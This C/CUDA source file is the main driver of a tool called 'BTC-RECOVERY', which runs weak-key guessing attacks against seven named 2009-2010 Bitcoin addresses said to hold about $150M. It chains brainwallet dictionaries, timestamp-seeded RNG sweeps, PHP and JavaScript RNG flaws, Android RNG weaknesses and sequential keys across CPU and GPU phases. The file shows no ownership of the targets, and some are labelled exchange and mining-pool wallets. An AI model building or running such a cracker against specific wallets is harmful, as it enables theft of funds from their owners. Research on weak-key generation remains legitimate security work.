/* ================================================================
 *  BTC-RECOVERY v1.0 — Bitcoin Private Key Recovery
 *  
 *  Systematic search of weak-key hypotheses for 2009-2010
 *  era Bitcoin addresses (8 targets, ~$150M+ total)
 *  
 *  Targets:
 *    A1: 12rMpw5...  400 BTC   2010-03-16  (exchange deposit)
 *    A3: 1JA4Mpu...  400 BTC   2010-07-15  (exchange withdrawal)
 *    A4: 13GvAdk...  200 BTC   2010-07-15  (mining/exchange)
 *    A5: 1DTy9z4...  200 BTC   2010-07-17  (mining 50×4 ✓)
 *    A6: 1MVLP2k... 1200 BTC   2010-09-10  (mining pool)
 *    A7: 15QezNw...  200 BTC   2010-09-16  (mining 50×4 ✓)
 *    E1: 198aMn6...  250 BTC   2009        (genesis era)
 *    [A2 IGNORED: 2020 dust collector, not 2010]
 *  
 *  Phases:
 *    1. FAST  — CPU small keyspace (< 1M)
 *    2. GPU   — H36 timestamp ms sweep (2009-2011)
 *    3. MED   — CPU medium keyspace (1M-500M)
 *    4. SLOW  — CPU large keyspace (H17/H18/H23)
 *  
 *  Compile:
 *    nvcc -O2 -arch=sm_100 -std=c++11 main.cu cpu/hypotheses.cu \
 *         gpu/timestamp_sweep.cu \
 *         -lsecp256k1 -lssl -lcrypto -Xcompiler -fopenmp \
 *         -o btc-recovery
 *  
 *  Run:
 *    export LD_LIBRARY_PATH=/usr/local/lib && ./btc-recovery
 * ================================================================ */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#include <cuda_runtime.h>

#include <secp256k1.h>
#include <openssl/sha.h>
#include <openssl/ripemd.h>

#include "common/targets.h"
#include "common/check.h"

/* GPU function (declared extern in timestamp_sweep.cu) */
int h36_timestamp_ms_sweep(void);

/* CPU hypotheses */
int h01_brainwallet(const secp256k1_context *ctx);
int h03_timestamp_pid(const secp256k1_context *ctx);
int h07_android(const secp256k1_context *ctx);
int h08_blockhashes(const secp256k1_context *ctx);
int h09_deep_brainwallet(const secp256k1_context *ctx);
int h11_weakkeys(const secp256k1_context *ctx);
int h14_timestamp_string(const secp256k1_context *ctx);
int h15_date_formats(const secp256k1_context *ctx);
int h17_ts_word(const secp256k1_context *ctx);
int h18_multiword(const secp256k1_context *ctx);
int h20_srand_time(const secp256k1_context *ctx);
int h21_empty_string(const secp256k1_context *ctx);
int h23_php_mt_wallet(const secp256k1_context *ctx);
int h24_js_math_random(const secp256k1_context *ctx);
int h25_bitcointalk_phrases(const secp256k1_context *ctx);
int h26_wallet_backup_passwords(const secp256k1_context *ctx);
int h27_url_brainwallets(const secp256k1_context *ctx);
int h28_sequential_keys(const secp256k1_context *ctx);
int h29_bitcoin_suffix_patterns(const secp256k1_context *ctx);
int h30_amount_words(const secp256k1_context *ctx);
int h31_date_passphrases(const secp256k1_context *ctx);
int h32_date_amount(const secp256k1_context *ctx);
int h33_mining_words(const secp256k1_context *ctx);
int h34_timestamp_full_dt(const secp256k1_context *ctx);
int h35_periodic_patterns(const secp256k1_context *ctx);
int h41_leet_words(const secp256k1_context *ctx);
int h42_hex_seeds(const secp256k1_context *ctx);
int h43_unicode_combos(const secp256k1_context *ctx);

/* ================================================================
 *  MAIN
 * ================================================================ */

int main(void) {
    log_init();
    log_msg("=== BTC-RECOVERY v1.0 ===");
    log_msg("8 targets: %d primary, %d ignored, %d extra",
            7, 1, 1);

    /* Create secp256k1 context */
    secp256k1_context *ctx = secp256k1_context_create(
        SECP256K1_CONTEXT_SIGN | SECP256K1_CONTEXT_VERIFY);

    int found = 0;
    uint64_t total_keys = 0;

    /* ============================================================
     *  PHASE 1: FAST CPU checks (< 1M keys)
     *  Run once across all targets (check_privkey_multi handles it)
     * ============================================================ */
    log_msg("");
    log_msg("========== PHASE 1: FAST CPU ==========");

    if (!found) { found = h21_empty_string(ctx);          total_keys += 1; }
    if (!found) { found = h11_weakkeys(ctx);              total_keys += 10; }
    if (!found) { found = h14_timestamp_string(ctx);      total_keys += 8; }
    if (!found) { found = h15_date_formats(ctx);          total_keys += 112; }
    if (!found) { found = h30_amount_words(ctx);          total_keys += 40; }
    if (!found) { found = h31_date_passphrases(ctx);      total_keys += 80; }
    if (!found) { found = h32_date_amount(ctx);           total_keys += 30; }
    if (!found) { found = h33_mining_words(ctx);          total_keys += 50; }
    if (!found) { found = h34_timestamp_full_dt(ctx);    total_keys += 96; }
    if (!found) { found = h35_periodic_patterns(ctx);    total_keys += 30; }
    if (!found) { found = h29_bitcoin_suffix_patterns(ctx); total_keys += 3000; }
    if (!found) { found = h26_wallet_backup_passwords(ctx); total_keys += 300; }
    if (!found) { found = h27_url_brainwallets(ctx);      total_keys += 300; }
    if (!found) { found = h25_bitcointalk_phrases(ctx);   total_keys += 5000; }
    if (!found) { found = h41_leet_words(ctx);            total_keys += 60; }
    if (!found) { found = h42_hex_seeds(ctx);             total_keys += 80; }
    if (!found) { found = h43_unicode_combos(ctx);        total_keys += 50; }
    if (!found) { found = h08_blockhashes(ctx);           total_keys += 200000; }
    if (!found) { found = h28_sequential_keys(ctx);       total_keys += 2000000; }
    if (!found) { found = h20_srand_time(ctx);            total_keys += 7201; }
    if (!found) { found = h03_timestamp_pid(ctx);         total_keys += 262000; }
    if (!found) { found = h17_ts_word(ctx);               total_keys += 84; }

    /* ============================================================
     *  PHASE 2: GPU TIMESTAMP ms SWEEP (2009-2011)
     *  Checks ALL 8 targets simultaneously
     *  ~95B keys on RTX 5090 (~1 second)
     * ============================================================ */
    log_msg("");
    log_msg("========== PHASE 2: GPU H36 TIMESTAMP ms SWEEP ==========");

    if (!found) {
        int gpu_res = h36_timestamp_ms_sweep();
        if (gpu_res) {
            found = 1;
            total_keys += 94675968000ULL;
        }
    }

    /* ============================================================
     *  PHASE 3: MEDIUM CPU (1M - 500M keys)
     * ============================================================ */
    log_msg("");
    log_msg("========== PHASE 3: MEDIUM CPU ==========");

    if (!found) { found = h07_android(ctx);               total_keys += 40000000; }
    if (!found) { found = h24_js_math_random(ctx);        total_keys += 30000000; }
    if (!found) { found = h01_brainwallet(ctx);           total_keys += 7000000; }
    if (!found) { found = h09_deep_brainwallet(ctx);      total_keys += 500000000; }

    /* ============================================================
     *  PHASE 4: SLOW CPU (H17/H18/H23/H03 full)
     * ============================================================ */
    log_msg("");
    log_msg("========== PHASE 4: SLOW CPU ==========");

    if (!found) { found = h17_ts_word(ctx);               total_keys += 1000000; }
    if (!found) { found = h18_multiword(ctx);             total_keys += 500000; }
    if (!found) { found = h23_php_mt_wallet(ctx);         total_keys += 10000000000ULL; }
    if (!found) { found = h03_timestamp_pid(ctx);         total_keys += 1000000; }

    /* ============================================================
     *  DONE
     * ============================================================ */
    log_msg("");
    if (found) {
        log_msg("=== KEY FOUND! ===");
    } else {
        log_msg("=== No key found in any hypothesis. ===");
    }

    log_msg("Total keys checked: %llu", (unsigned long long)total_keys);

    secp256k1_context_destroy(ctx);
    if (g_log) fclose(g_log);
    return found ? 0 : 1;
}
